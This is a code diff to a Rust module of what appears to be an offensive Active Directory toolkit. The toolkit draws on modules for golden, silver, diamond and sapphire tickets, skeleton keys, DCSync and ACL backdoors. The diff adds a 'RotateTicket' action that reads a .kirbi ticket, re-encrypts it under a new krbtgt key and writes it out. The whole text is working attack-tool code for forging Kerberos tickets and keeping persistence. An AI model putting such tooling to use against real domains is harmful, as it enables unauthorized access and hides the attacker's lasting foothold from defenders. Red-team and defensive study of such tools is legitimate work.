@@ -7,8 +7,8 @@ use overthrone_core::proto::kerberos::TicketGrantingData;
 use serde::{Deserialize, Serialize};
 
 use crate::{
-    acl_backdoor, bronze_bit, convert, dcsync_user, diamond, dsrm, golden, nopac, sapphire, silver,
-    skeleton,
+    acl_backdoor, bronze_bit, convert, dcsync_user, diamond, dsrm, golden, nopac, rotate,
+    sapphire, silver, skeleton,
 };
 
 /// What kind of ticket/persistence to forge
@@ -45,6 +45,17 @@ pub enum ForgeAction {
         input_path: String,
         /// Output format: kirbi, ccache, base64
         output_format: String,
+    },
+    /// Re-encrypt a ticket under a different krbtgt key (ticket rotation).
+    RotateTicket {
+        /// Input .kirbi file path
+        input_path: String,
+        /// Old krbtgt key hex
+        old_key: String,
+        /// New krbtgt key hex
+        new_key: String,
+        /// Output .kirbi file path
+        output_path: String,
     },
     /// Convert a cracked AS-REP roast password into a usable TGT.
     /// Takes the plaintext password from AS-REP roasting and requests
@@ -124,6 +135,13 @@ impl std::fmt::Display for ForgeAction {
                 output_format,
             } => {
                 write!(f, "Convert Ticket ({} -> {})", input_path, output_format)
+            }
+            Self::RotateTicket {
+                input_path,
+                output_path,
+                ..
+            } => {
+                write!(f, "Rotate Ticket ({} -> {})", input_path, output_path)
             }
             Self::AsRepToTgt { hash: Some(_), .. } => write!(f, "AS-REP hash -> TGT"),
             Self::AsRepToTgt { .. } => write!(f, "AS-REP password -> TGT"),
@@ -486,6 +504,37 @@ pub async fn run_forge(config: &ForgeConfig) -> Result<ForgeResult> {
                     input_path,
                     output_path,
                     output_bytes.len()
+                ),
+            }
+        }
+        ForgeAction::RotateTicket {
+            input_path,
+            old_key,
+            new_key,
+            output_path,
+        } => {
+            let input_bytes = tokio::fs::read(input_path).await.map_err(|e| {
+                OverthroneError::TicketForge(format!("Cannot read input file {input_path}: {e}"))
+            })?;
+            let rotated = rotate::rotate_ticket_encryption(&input_bytes, old_key, new_key)?;
+            tokio::fs::write(output_path, &rotated.kirbi)
+                .await
+                .map_err(|e| {
+                    OverthroneError::TicketForge(format!("Cannot write {output_path}: {e}"))
+                })?;
+            ForgeResult {
+                action: format!("Rotated ticket {} -> {}", input_path, output_path),
+                domain: String::new(),
+                success: true,
+                ticket_data: None,
+                persistence_result: None,
+                message: format!(
+                    "Ticket rotated: {} -> {} (old etype: {}, new etype: {}, {} bytes)",
+                    input_path,
+                    output_path,
+                    golden::etype_name(rotated.old_etype),
+                    golden::etype_name(rotated.new_etype),
+                    rotated.kirbi.len()
                 ),
             }
         }
